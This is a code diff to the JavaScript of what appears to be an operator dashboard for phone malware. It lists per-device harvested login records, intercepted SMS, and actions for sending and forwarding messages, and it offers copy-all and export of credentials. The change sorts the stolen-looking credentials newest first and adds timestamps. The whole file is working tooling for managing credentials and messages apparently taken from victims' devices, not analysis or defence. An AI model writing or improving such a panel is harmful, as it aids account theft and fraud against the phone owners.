@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - COMPLETE WITH DEVICE CARD CSS INTEGRATION          */
+/* app.js - COMPLETE WITH LATEST FIRST CREDENTIALS             */
 /* ============================================================ */
 
 // ============================================================
@@ -55,7 +55,6 @@ const state = {
     pendingUpdates: new Set(),
     isFirstLoad: true,
     dataVersion: 0,
-    // Credentials catalog state
     credCatalogData: [],
     credFilter: 'all',
     credSearchQuery: '',
@@ -312,7 +311,7 @@ function getFilteredDeviceKeys() {
 }
 
 // ============================================================
-// RENDER DEVICES - WITH PREMIUM CSS CLASSES
+// RENDER DEVICES - WITH PREMIUM CSS
 // ============================================================
 function renderDevicesOptimized() {
     const container = $('devicesContainer');
@@ -367,7 +366,7 @@ function renderDevicesOptimized() {
 }
 
 // ============================================================
-// BUILD DEVICE CARD - PREMIUM LAYOUT WITH device-card.css
+// BUILD DEVICE CARD - PREMIUM WITH LATEST FIRST
 // ============================================================
 function buildDeviceCardPremium(devId, index, devices) {
     const dev = devices[devId] || {};
@@ -385,8 +384,13 @@ function buildDeviceCardPremium(devId, index, devices) {
     const loginData = state.data.login || {};
     let devLoginList = [];
     if (loginData[devId]) {
-        Object.keys(loginData[devId]).forEach(k => devLoginList.push(loginData[devId][k]));
-        devLoginList.reverse();
+        Object.keys(loginData[devId]).forEach(k => {
+            const credData = loginData[devId][k];
+            credData._timestamp = credData.timestamp || credData.date || Date.now();
+            devLoginList.push(credData);
+        });
+        // SORT - LATEST FIRST
+        devLoginList.sort((a, b) => (b._timestamp || 0) - (a._timestamp || 0));
     }
     
     const isExpanded = state.expandedDevices.get(devId) || false;
@@ -401,13 +405,22 @@ function buildDeviceCardPremium(devId, index, devices) {
         devSmsList = smsCache.all.slice(startIdx, endIdx).reverse();
     }
     
-    // Build Credentials HTML - Premium
+    // Build Credentials HTML - LATEST FIRST
     let credsHtml = '';
     if (devLoginList.length > 0) {
         credsHtml = devLoginList.map((rec, idx) => {
             let fields = '';
+            let timestamp = rec.timestamp || rec.date || '';
+            let displayTime = '';
+            if (timestamp) {
+                try {
+                    const d = new Date(timestamp);
+                    displayTime = d.toLocaleString();
+                } catch(e) { displayTime = ''; }
+            }
+            
             for (let k in rec) {
-                if (k === 'key' || k === 'timestamp') continue;
+                if (k === 'key' || k === 'timestamp' || k === 'date' || k === '_timestamp') continue;
                 const value = rec[k] || 'N/A';
                 const escaped = escapeHtml(String(value));
                 fields += `
@@ -425,7 +438,7 @@ function buildDeviceCardPremium(devId, index, devices) {
             return `
                 <div class="cred-item-premium">
                     <div class="cred-header-premium">
-                        <span>📋 Record ${idx+1}</span>
+                        <span>📋 Record ${idx+1} ${displayTime ? '🕐 ' + escapeHtml(displayTime) : ''}</span>
                         <span style="font-size:9px;color:var(--text-muted);">#${idx+1}</span>
                     </div>
                     <div class="cred-fields-premium">${fields}</div>
@@ -434,7 +447,7 @@ function buildDeviceCardPremium(devId, index, devices) {
         }).join('');
     }
     
-    // Build SMS HTML - Premium
+    // Build SMS HTML
     let smsHtml = '';
     if (devSmsList.length > 0) {
         smsHtml = devSmsList.map(msg => {
@@ -590,21 +603,17 @@ function buildDeviceCardPremium(devId, index, devices) {
         `
     };
     
-    // Combine all sections
     let sectionsHtml = '';
     ['sms', 'login', 'call', 'sendsms', 'fwd', 'backup', 'delete'].forEach(key => {
         sectionsHtml += sections[key] || '';
     });
     
-    // Build the complete premium card
     return `
         <div class="device-card-premium ${statusClass} ${isExpanded ? 'expanded' : ''}" id="card-${devId}" data-device-id="${devId}">
-            <!-- Swipe Delete Hint -->
             <div class="swipe-delete-hint">
                 <i class="fas fa-trash"></i> Delete
             </div>
             
-            <!-- Card Header -->
             <div class="card-header" onclick="toggleDevice('${devId}')">
                 <div class="device-info-left">
                     <div class="device-name-premium">
@@ -632,7 +641,6 @@ function buildDeviceCardPremium(devId, index, devices) {
                 </div>
             </div>
             
-            <!-- Info Grid -->
             <div class="info-grid-premium" onclick="toggleDevice('${devId}')">
                 <div class="info-item-premium">
                     <span class="info-label">Device</span>
@@ -652,20 +660,15 @@ function buildDeviceCardPremium(devId, index, devices) {
                 </div>
             </div>
             
-            <!-- Expand Hint -->
             <div class="expand-hint" onclick="toggleDevice('${devId}')">
                 <i class="fas fa-chevron-down"></i>
                 ${isExpanded ? 'Click to collapse' : 'Click to expand'}
             </div>
             
-            <!-- Expandable Content -->
             <div class="expandable-content">
-                <!-- Actions Row -->
                 <div class="actions-row-premium">
                     ${actionsHtml}
                 </div>
-                
-                <!-- Sections -->
                 ${sectionsHtml}
             </div>
         </div>
@@ -728,7 +731,6 @@ function setTab(devId, tab) {
             return;
         }
         
-        // Update action buttons
         const buttons = card.querySelectorAll('.action-btn-premium');
         const activeTab = state.activeTabs.get(devId);
         
@@ -744,7 +746,6 @@ function setTab(devId, tab) {
             else if (text.includes('Delete') && activeTab === 'delete') btn.classList.add('active-delete');
         });
         
-        // Update sections
         const sections = card.querySelectorAll('.section-premium');
         sections.forEach(sec => sec.classList.remove('active'));
         
@@ -863,7 +864,7 @@ function updateDeviceStatusUI(devId, isOnline, lastSeen) {
 }
 
 // ============================================================
-// TOGGLE PANEL - WITH CREDENTIALS
+// TOGGLE PANEL
 // ============================================================
 function togglePanel(panel) {
     const panels = ['devices', 'sms', 'credentials', 'backup', 'analytics'];
@@ -1762,11 +1763,7 @@ function escapeHtml(text) {
 }
 
 // ============================================================
-// CREDENTIALS CATALOG - COMPLETE
-// ============================================================
-
-// ============================================================
-// RENDER CREDENTIALS CATALOG
+// CREDENTIALS CATALOG - WITH LATEST FIRST
 // ============================================================
 function renderCredentialsCatalog() {
     const grid = document.getElementById('credsGrid');
@@ -1775,7 +1772,6 @@ function renderCredentialsCatalog() {
     
     if (!grid) return;
     
-    // Collect all credentials
     const loginData = state.data.login || {};
     const devices = state.data.user_data || {};
     
@@ -1789,9 +1785,13 @@ function renderCredentialsCatalog() {
             deviceWithCreds++;
             const credList = [];
             Object.keys(creds).forEach(key => {
-                credList.push({ key, ...creds[key] });
+                const credData = { key, ...creds[key] };
+                credData._timestamp = credData.timestamp || credData.date || Date.now();
+                credList.push(credData);
             });
-            credList.reverse();
+            // SORT - LATEST FIRST
+            credList.sort((a, b) => (b._timestamp || 0) - (a._timestamp || 0));
+            
             state.credCatalogData.push({
                 deviceId: devId,
                 serial: state.deviceSerialMap.get(devId) || 0,
@@ -1803,28 +1803,28 @@ function renderCredentialsCatalog() {
         }
     });
     
-    state.credCatalogData.sort((a, b) => b.serial - a.serial);
+    // Sort devices by serial first, then by latest credential
+    state.credCatalogData.sort((a, b) => {
+        if (a.serial !== b.serial) return b.serial - a.serial;
+        const aLatest = a.credentials.length > 0 ? a.credentials[0]._timestamp : 0;
+        const bLatest = b.credentials.length > 0 ? b.credentials[0]._timestamp : 0;
+        return bLatest - aLatest;
+    });
     
-    // Update counts
     const totalEl = document.getElementById('catalogTotalCreds');
     const devicesEl = document.getElementById('catalogTotalDevices');
     if (totalEl) totalEl.textContent = totalCreds;
     if (devicesEl) devicesEl.textContent = deviceWithCreds;
     
-    // Build tabs
     buildCredDeviceTabs(tabs);
     
-    // Apply filters
     let filteredData = applyCredFilters(state.credCatalogData);
-    
-    // Paginate
     const totalPages = Math.ceil(filteredData.length / CREDS_PER_PAGE);
     if (state.credCurrentPage > totalPages) state.credCurrentPage = Math.max(1, totalPages);
     const start = (state.credCurrentPage - 1) * CREDS_PER_PAGE;
     const end = Math.min(start + CREDS_PER_PAGE, filteredData.length);
     const pageData = filteredData.slice(start, end);
     
-    // Render grid
     if (pageData.length === 0) {
         grid.innerHTML = `
             <div class="no-creds" style="grid-column:1/-1;">
@@ -1838,6 +1838,81 @@ function renderCredentialsCatalog() {
     }
     
     renderCredPagination(pagination, totalPages, filteredData.length);
+}
+
+// ============================================================
+// BUILD CREDENTIAL CARD
+// ============================================================
+function buildCredCard(item) {
+    const deviceName = item.deviceInfo.d_name || item.deviceInfo.device_name || item.deviceId;
+    const serial = item.serial || 0;
+    
+    let credsHtml = item.credentials.map((cred, idx) => {
+        let fieldsHtml = '';
+        let timestamp = cred.timestamp || cred.date || '';
+        let displayTime = '';
+        if (timestamp) {
+            try {
+                const d = new Date(timestamp);
+                displayTime = d.toLocaleString();
+            } catch(e) { displayTime = ''; }
+        }
+        
+        for (let k in cred) {
+            if (k === 'key' || k === 'timestamp' || k === 'date' || k === '_timestamp') continue;
+            const value = cred[k] || 'N/A';
+            const fieldId = `cred-${item.deviceId}-${idx}-${k}`;
+            fieldsHtml += `
+                <div class="cred-field">
+                    <span class="field-label">${escapeHtml(k)}</span>
+                    <span class="field-value">
+                        <span id="${fieldId}">${escapeHtml(String(value))}</span>
+                        <button class="copy-field-btn" onclick="copyField('${fieldId}')">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                    </span>
+                </div>
+            `;
+        }
+        
+        return `
+            <div class="cred-item">
+                <div class="cred-item-header">
+                    <span class="record-num">#${idx + 1} ${displayTime ? '📅 ' + escapeHtml(displayTime) : ''}</span>
+                    <div class="cred-actions">
+                        <button onclick="copyAllCreds('${item.deviceId}', ${idx})" title="Copy All">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                        <button class="danger" onclick="deleteSingleCred('${item.deviceId}', ${idx})" title="Delete">
+                            <i class="fas fa-trash"></i>
+                        </button>
+                    </div>
+                </div>
+                <div class="cred-fields">${fieldsHtml}</div>
+            </div>
+        `;
+    }).join('');
+    
+    const latestTime = item.credentials.length > 0 ? new Date(item.credentials[0]._timestamp).toLocaleTimeString() : '';
+    
+    return `
+        <div class="cred-card" data-device="${item.deviceId}">
+            <div class="cred-card-header">
+                <div class="device-name-tag">
+                    <span class="dev-icon"><i class="fas fa-mobile-alt"></i></span>
+                    <span class="dev-name">${escapeHtml(deviceName)}</span>
+                    ${serial > 0 ? `<span class="dev-serial">S-${serial}</span>` : ''}
+                    ${latestTime ? `<span class="dev-serial" style="background:rgba(16,185,129,0.12);color:var(--green);">🕐 ${latestTime}</span>` : ''}
+                </div>
+                <span class="cred-count-badge">
+                    <i class="fas fa-key"></i> ${item.count}
+                </span>
+            </div>
+            <div class="cred-card-body">
+                ${credsHtml}
+            </div>
+        </div>
+    `;
 }
 
 // ============================================================
@@ -1858,82 +1933,27 @@ function buildCredDeviceTabs(container) {
         <i class="fas fa-circle"></i> No Creds <span class="tab-count">${state.credCatalogData.filter(d => d.count === 0).length}</span>
     </button>`;
     
+    // Show devices with most recent credentials first
     const topDevices = [...state.credCatalogData]
         .filter(d => d.count > 0)
-        .sort((a, b) => b.count - a.count)
+        .sort((a, b) => {
+            const aLatest = a.credentials.length > 0 ? a.credentials[0]._timestamp : 0;
+            const bLatest = b.credentials.length > 0 ? b.credentials[0]._timestamp : 0;
+            return bLatest - aLatest;
+        })
         .slice(0, 5);
     
     topDevices.forEach(item => {
         const name = item.deviceInfo.d_name || item.deviceInfo.device_name || item.deviceId;
+        const latestTime = item.credentials.length > 0 ? new Date(item.credentials[0]._timestamp).toLocaleDateString() : '';
         html += `<button class="filter-tab" onclick="filterCredsByDevice('${item.deviceId}')" data-filter="${item.deviceId}">
-            📱 ${escapeHtml(name.substring(0, 10))} <span class="tab-count">${item.count}</span>
+            📱 ${escapeHtml(name.substring(0, 10))} 
+            <span class="tab-count">${item.count}</span>
+            ${latestTime ? `<span style="font-size:8px;color:var(--text-muted);margin-left:2px;">🕐${latestTime}</span>` : ''}
         </button>`;
     });
     
     container.innerHTML = html;
-}
-
-// ============================================================
-// BUILD CREDENTIAL CARD
-// ============================================================
-function buildCredCard(item) {
-    const deviceName = item.deviceInfo.d_name || item.deviceInfo.device_name || item.deviceId;
-    const serial = item.serial || 0;
-    
-    let credsHtml = item.credentials.map((cred, idx) => {
-        let fieldsHtml = '';
-        for (let k in cred) {
-            if (k === 'key' || k === 'timestamp') continue;
-            const value = cred[k] || 'N/A';
-            const fieldId = `cred-${item.deviceId}-${idx}-${k}`;
-            fieldsHtml += `
-                <div class="cred-field">
-                    <span class="field-label">${escapeHtml(k)}</span>
-                    <span class="field-value">
-                        <span id="${fieldId}">${escapeHtml(String(value))}</span>
-                        <button class="copy-field-btn" onclick="copyField('${fieldId}')">
-                            <i class="fas fa-copy"></i>
-                        </button>
-                    </span>
-                </div>
-            `;
-        }
-        
-        return `
-            <div class="cred-item">
-                <div class="cred-item-header">
-                    <span class="record-num">#${idx + 1}</span>
-                    <div class="cred-actions">
-                        <button onclick="copyAllCreds('${item.deviceId}', ${idx})" title="Copy All">
-                            <i class="fas fa-copy"></i>
-                        </button>
-                        <button class="danger" onclick="deleteSingleCred('${item.deviceId}', ${idx})" title="Delete">
-                            <i class="fas fa-trash"></i>
-                        </button>
-                    </div>
-                </div>
-                <div class="cred-fields">${fieldsHtml}</div>
-            </div>
-        `;
-    }).join('');
-    
-    return `
-        <div class="cred-card" data-device="${item.deviceId}">
-            <div class="cred-card-header">
-                <div class="device-name-tag">
-                    <span class="dev-icon"><i class="fas fa-mobile-alt"></i></span>
-                    <span class="dev-name">${escapeHtml(deviceName)}</span>
-                    ${serial > 0 ? `<span class="dev-serial">S-${serial}</span>` : ''}
-                </div>
-                <span class="cred-count-badge">
-                    <i class="fas fa-key"></i> ${item.count}
-                </span>
-            </div>
-            <div class="cred-card-body">
-                ${credsHtml}
-            </div>
-        </div>
-    `;
 }
 
 // ============================================================
@@ -1956,12 +1976,10 @@ function applyCredFilters(data) {
             const deviceMatch = item.deviceId.toLowerCase().includes(query) ||
                                (item.deviceInfo.d_name || '').toLowerCase().includes(query) ||
                                (item.deviceInfo.device_name || '').toLowerCase().includes(query);
-            
             if (deviceMatch) return true;
-            
             return item.credentials.some(cred => {
                 for (let k in cred) {
-                    if (k === 'key' || k === 'timestamp') continue;
+                    if (k === 'key' || k === 'timestamp' || k === 'date' || k === '_timestamp') continue;
                     const value = String(cred[k] || '').toLowerCase();
                     if (value.includes(query)) return true;
                 }
@@ -2001,11 +2019,7 @@ function filterCreds(filter) {
 function filterCredsByDevice(deviceId) {
     state.credFilter = deviceId;
     state.credCurrentPage = 1;
-    
-    document.querySelectorAll('.catalog-toolbar .toolbar-btn').forEach(btn => {
-        btn.classList.remove('active');
-    });
-    
+    document.querySelectorAll('.catalog-toolbar .toolbar-btn').forEach(btn => btn.classList.remove('active'));
     renderCredentialsCatalog();
 }
 
@@ -2031,11 +2045,7 @@ function searchCredentials(query) {
 // ============================================================
 function renderCredPagination(container, totalPages, totalItems) {
     if (!container) return;
-    
-    if (totalPages <= 1) {
-        container.innerHTML = '';
-        return;
-    }
+    if (totalPages <= 1) { container.innerHTML = ''; return; }
     
     let html = `
         <button onclick="credGoToPage(${state.credCurrentPage - 1})" ${state.credCurrentPage <= 1 ? 'disabled' : ''}>
@@ -2088,7 +2098,7 @@ function copyAllCreds(deviceId, index) {
     const cred = data.credentials[index];
     let text = '';
     for (let k in cred) {
-        if (k === 'key' || k === 'timestamp') continue;
+        if (k === 'key' || k === 'timestamp' || k === 'date' || k === '_timestamp') continue;
         text += `${k}: ${cred[k]}\n`;
     }
     
@@ -2149,7 +2159,7 @@ function exportCredentials() {
         item.credentials.forEach((cred, idx) => {
             text += `   Record #${idx + 1}:\n`;
             for (let k in cred) {
-                if (k === 'key' || k === 'timestamp') continue;
+                if (k === 'key' || k === 'timestamp' || k === 'date' || k === '_timestamp') continue;
                 text += `      ${k}: ${cred[k]}\n`;
             }
             text += `   ${'-'.repeat(30)}\n`;
@@ -2170,7 +2180,6 @@ function exportCredentials() {
 // ============================================================
 // MOBILE ENHANCEMENTS
 // ============================================================
-
 function toggleFabMenu() {
     const main = document.querySelector('.fab-main');
     const actions = document.getElementById('fabActions');
@@ -2198,7 +2207,6 @@ function closeBottomSheet() {
 function showDeviceInBottomSheet(devId) {
     const dev = state.data.user_data?.[devId];
     if (!dev) return;
-    
     const online = state.deviceOnlineStatus.get(devId) || false;
     const content = `
         <h3 style="color:var(--gold);font-size:18px;margin-bottom:12px;">📱 ${escapeHtml(devId)}</h3>
@@ -2238,7 +2246,6 @@ function showDeviceInBottomSheet(devId) {
 }
 
 // ===== PULL TO REFRESH =====
-let pullStartY = 0;
 let refreshIndicator = null;
 
 function initPullToRefresh() {
@@ -2268,7 +2275,6 @@ function initPullToRefresh() {
         if (!isDragging) return;
         const currentY = e.touches[0].clientY;
         const diff = currentY - startY;
-        
         if (diff > 0 && window.scrollY === 0) {
             e.preventDefault();
             if (refreshIndicator) {
@@ -2290,9 +2296,7 @@ function initPullToRefresh() {
         if (!isDragging) return;
         isDragging = false;
         if (!refreshIndicator) return;
-        
         const diff = parseInt(refreshIndicator.style.transform.replace('translateY(', '')) || 0;
-        
         if (diff > 60) {
             refreshIndicator.querySelector('.pull-text').textContent = 'Refreshing...';
             refreshIndicator.querySelector('.pull-icon i').className = 'fas fa-spinner fa-spin';
@@ -2326,7 +2330,6 @@ function initSwipeToDelete() {
         const card = e.target.closest('.device-card-premium');
         if (!card) return;
         if (e.target.closest('button') || e.target.closest('input') || e.target.closest('select') || e.target.closest('textarea')) return;
-        
         swipeStartX = e.touches[0].clientX;
         swipeTarget = card;
         isSwiping = true;
@@ -2337,7 +2340,6 @@ function initSwipeToDelete() {
         if (!isSwiping || !swipeTarget) return;
         swipeCurrentX = e.touches[0].clientX;
         const diff = swipeCurrentX - swipeStartX;
-        
         if (diff < -20) {
             e.preventDefault();
             const translateX = Math.max(diff, -120);
@@ -2354,7 +2356,6 @@ function initSwipeToDelete() {
         isSwiping = false;
         const diff = swipeCurrentX - swipeStartX;
         swipeTarget.style.transition = 'transform 0.3s ease';
-        
         if (diff < -80) {
             const devId = swipeTarget.dataset.deviceId;
             if (devId) {
@@ -2388,7 +2389,6 @@ function initLongPress() {
         const card = e.target.closest('.device-card-premium');
         if (!card) return;
         if (e.target.closest('button') || e.target.closest('input') || e.target.closest('select') || e.target.closest('textarea')) return;
-        
         longPressTarget = card;
         longPressTimer = setTimeout(() => {
             if (longPressTarget) {
@@ -2423,7 +2423,6 @@ function initLongPress() {
 // DOM CONTENT LOADED
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
-    // Backup select change
     const backupSelect = $('backupDeviceSelect');
     if (backupSelect) {
         backupSelect.addEventListener('change', function() {
@@ -2439,7 +2438,6 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
     
-    // Search
     const searchInput = $('deviceSearchInput');
     const clearBtn = $('searchClearBtn');
     if (searchInput) {
@@ -2453,7 +2451,6 @@ document.addEventListener('DOMContentLoaded', function() {
         clearBtn.addEventListener('click', clearSearch);
     }
     
-    // Credentials search
     const credSearchInput = document.getElementById('credSearchInput');
     if (credSearchInput) {
         credSearchInput.addEventListener('input', function() {
@@ -2461,7 +2458,6 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
     
-    // Mobile enhancements
     if (window.innerWidth <= 900) {
         setTimeout(() => {
             initPullToRefresh();
@@ -2470,7 +2466,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }, 500);
     }
     
-    // Resize handler
     let resizeTimer;
     window.addEventListener('resize', function() {
         clearTimeout(resizeTimer);
@@ -2485,7 +2480,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }, 500);
     });
     
-    // Initial render
     setTimeout(() => performRender(), 100);
 });
 
